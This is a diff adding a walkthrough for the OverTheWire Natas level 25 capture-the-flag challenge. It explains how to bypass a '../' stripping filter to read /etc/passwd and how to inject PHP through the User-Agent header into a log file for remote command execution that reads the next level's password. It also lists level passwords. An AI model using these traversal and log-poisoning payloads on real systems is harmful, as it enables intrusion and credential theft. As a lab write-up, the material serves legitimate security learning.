@@ -472,3 +472,42 @@ response = session.post(url, data={'passwd[]': 'gzzz'}, auth=(username, password
 //
 GHF6X7YwACaYYssHVY05cFq83hRktl4c
 
+lvl 25 --> lvl 26
+http://netas25.natas.labs.overthewire.org/
+natas25
+GHF6X7YwACaYYssHVY05cFq83hRktl4c
+// The point of this level is to circumvent two obstacles to process a LFI and RCE with User-Agent
+// See the php code below :
+if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+}
+// First the code replaces ../ by '', so playing with python cmd we get that ..././ gives ../
+// So with the fallowing python code, we succeeded our LFI
+response = session.post(url, data = {'lang': '..././..././..././..././..././..././etc/passwd'}, auth=(username, password))
+// Now see the php code below, we cannot directly access /natas_webpass/ 
+        // dont let ppl steal our passwords
+if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+}
+// The code blacklists natas_webpass
+// So lets see some other interesting php code :
+function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+// We can acutally access the logs for natas25, to do that lets get the session_id, through session.cookies
+response = session.post(url, data = {'lang': '..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'}, auth=(username, password))
+// Answer : [05.02.2019 10::01:46] python-requests/2.20.1 "Directory traversal attempt! fixing request."
+// We have controle over the user agent python-requests/2.20.1 in our http header, we can change it.
+// Lets put php code in place of our user agent
+//
+headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
+response = session.post(url, headers = headers, data = {'lang': '..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'},
+// 
+oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
